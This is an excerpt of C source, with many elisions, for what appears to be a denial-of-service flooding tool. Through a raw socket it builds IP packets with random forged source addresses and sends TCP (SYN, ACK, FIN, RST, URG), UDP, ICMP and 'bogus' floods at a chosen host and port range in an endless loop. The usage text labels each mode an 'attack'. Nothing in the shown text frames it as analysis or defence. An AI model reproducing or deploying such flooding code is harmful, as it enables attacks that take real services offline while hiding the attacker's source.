...
struct {
  ...
  void (*f)(u_char);
    ...
    {UDP_CFF, 0, send_udp},      {ICMP_ECHO_G, ICMP_ECHO, send_icmp},
    {0, 0, (void *)NULL},
};
int main(int argc, char *argv[]) {
  ...
  while ((n = getopt(argc, argv, "T:UINs:h:d:p:q:l:t:")) != -1) {
    ...
    switch (n) {
      ...
      case 'd':
        ...
        break;
      case 'p':
        if ((p = (char *)strchr(optarg, ',')) == NULL) usage(argv[0]);
        dst_sp = atoi(optarg);
        dst_ep = atoi(p + 1);
        break;
      case 'q':
      ...
      case 'l':
        b_link = atoi(optarg);
        if (b_link <= 0 || b_link > 100) usage(argv[0]);
        break;
      case 't':
  ...
  if ((!dstaddr && !i) || (dstaddr && i) ||
      (!TCP_ATTACK() && !UDP_ATTACK() && !ICMP_ATTACK()) ||
      (src_sp != 0 && src_sp > src_ep) || (dst_sp != 0 && dst_sp > dst_ep))
    usage(argv[0]);
  ...
  if (setsockopt(rawsock, IPPROTO_IP, IP_HDRINCL, (char *)&on, sizeof(on)) <
      0) {
    perror("setsockopt");
    exit(-1);
  }
  ...
  for (n = 0;;) {
    if (b_link != -1 && random() % 100 + 1 > b_link) {
      if (random() % 200 + 1 > 199) usleep(1);
      continue;
    }
    for (i = 0; a_list[i].f != NULL; ++i) {
      if (a_list[i].gv & a_flags) a_list[i].f(a_list[i].kv);
    }
    if (n++ == 100) {
...
static void inject_iphdr(struct ip *ip, u_char p, u_char len) {
  ...
  ip->ip_ttl = 255;
  ip->ip_dst.s_addr =
      dst_class != NULL ? inet_addr(class2ip(dst_class)) : dstaddr;
  ip->ip_src.s_addr =
      src_class != NULL ? inet_addr(class2ip(src_class)) : random();
...
static void send_icmp(u_char gargabe) {
  struct packet {
    struct ip ip;
    struct icmp icmp;
  } packet;
...
static void usage(const char *argv0) {
  printf("%s \n", banner);
  printf(
      "    -U UDP   attack                         \e[1;37m(\e[0m\e[0;31mno "
      "options\e[0m\e[1;37m)\e[0m\n");
  printf(
      "    -I ICMP  attack                         \e[1;37m(\e[0m\e[0;31mno "
      "options\e[0m\e[1;37m)\e[0m\n");
  printf(
      "    -N Bogus attack                         \e[1;37m(\e[0m\e[0;31mno "
      "options\e[0m\e[1;37m)\e[0m\n");
  printf(
      "    -T TCP   attack     \e[1;37m[\e[0m0:ACK, 1:FIN, 2:RST, 3:SYN, "
      "4:URG\e[1;37m]\e[0m\n");
  printf(
      "    -h destination host/ip                  \e[1;37m(\e[0m\e[0;31mno "
  ...
  printf(
      ...
      "\e[1;37m(\e[0m\e[0;31mrandom\e[0m\e[1;37m)\e[0m\n");
  printf(
      "    -q source port range      [start,end]       "
      "\e[1;37m(\e[0m\e[0;31mrandom\e[0m\e[1;37m)\e[0m\n");
  printf(
      "    -l pps limiter                            \e[1;37m(\e[0m\e[0;31mno "
      "limit\e[0m\e[1;37m)\e[0m\n");
  printf(
      "    -t timeout                              \e[1;37m(\e[0m\e[0;31mno "
      "default\e[0m\e[1;37m)\e[0m\n");
